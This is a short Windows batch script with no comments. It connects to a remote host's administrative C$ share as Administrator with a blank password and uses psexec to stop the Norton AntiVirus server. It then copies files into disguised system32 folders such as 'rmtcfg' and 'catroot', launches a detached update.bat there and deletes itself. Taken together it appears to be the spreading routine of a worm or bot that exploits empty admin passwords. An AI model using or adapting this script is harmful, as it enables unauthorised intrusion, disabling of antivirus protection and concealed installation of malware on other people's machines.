net use u: /delete
net use \\65.34.88.177 /USER:Administrator
net use u: \\65.34.88.177\C$
psexec \\65.34.88.177 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\65.34.88.177 -u Administrator -p "" -c temp.bat
mkdir u:\winnt\system32\rmtcfg
mkdir u:\winnt\system32\catroot
copy copy\* u:\winnt\system32\rmtcfg
mkdir u:\winnt\system32\rmtcfg\files
mkdir u:\winnt\system32\rmtcfg\files\copy
mkdir u:\winnt\system32\rmtcfg\files\dat
mkdir u:\winnt\system32\rmtcfg\files\log
mkdir u:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* u:\winnt\system32\rmtcfg\files
copy copy\* u:\winnt\system32\rmtcfg\files\copy
copy plugin\* u:\winnt\system32\rmtcfg\files\plugin
copy dat\* u:\winnt\system32\rmtcfg\files\dat
psexec \\65.34.88.177 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use u: /delete
net use \\65.34.88.177 /delete
del runme977873.bat
